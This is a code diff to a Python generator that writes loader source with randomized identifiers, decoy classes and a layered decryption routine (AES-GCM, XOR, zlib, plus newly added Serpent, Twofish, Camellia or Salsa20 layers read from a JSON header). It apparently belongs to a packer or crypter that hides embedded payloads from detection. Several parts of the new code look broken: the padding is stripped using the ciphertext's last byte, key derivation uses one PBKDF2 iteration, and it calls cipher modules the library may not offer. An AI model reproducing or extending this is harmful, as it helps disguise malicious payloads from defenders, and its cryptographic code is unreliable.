@@ -101,6 +101,7 @@ def gen_loader_source() -> str:
     f_filter = _rand_name()
     f_extract = _rand_name()
     f_run = "run"
+    f_extra = _rand_name()
     cls_L = _rand_name()
     cls_F = _rand_name()
 
@@ -157,10 +158,36 @@ def {f_filter}(mk, shards):
 def {f_load}(p, mk):
     """Full decrypt: AES-GCM then XOR."""
     ct = bytes.fromhex(p["d"])
+    hdr = p.get("h", "")
     from cryptography.hazmat.primitives.ciphers.aead import AESGCM
     x = AESGCM(mk).decrypt(ct[:12], ct[12:], b"")
     ks = {f_xof}(len(x), hashlib.sha256(mk).digest())
-    return zlib.decompress(bytes(a^b for a,b in zip(x,ks))).decode()
+    x = bytes(a^b for a,b in zip(x,ks))
+    if hdr:
+        x = {f_extra}(x, mk, hdr)
+    return zlib.decompress(x).decode()
+
+def {f_extra}(ct, mk, hdr):
+    import json, hashlib
+    try:
+        h = json.loads(hdr) if isinstance(hdr, str) else {{}}
+    except:
+        return ct
+    for algo in reversed(h.get("extra_layers", [])):
+        info = h["layer_ivs"].get(algo, {{}})
+        iv = bytes.fromhex(info.get("iv", ""))
+        salt = bytes.fromhex(info.get("salt", ""))
+        lk = hashlib.pbkdf2_hmac("sha256", mk, salt, 1, 32)
+        if algo == "serpent" or algo == "twofish" or algo == "camellia":
+            mod = __import__("Cryptodome.Cipher", fromlist=[algo.capitalize()])
+            cls = getattr(mod, algo.capitalize())
+            c = cls.new(lk, cls.MODE_CBC, iv=iv[:16])
+            ct = c.decrypt(ct)[:-ct[-1]]
+        elif algo == "salsa20":
+            mod = __import__("Cryptodome.Cipher", fromlist=["Salsa20"])
+            c = mod.Salsa20.new(key=lk, nonce=iv[:8])
+            ct = c.decrypt(ct)
+    return ct
 
 # Decoy classes and functions
 class {_rand_name()}:
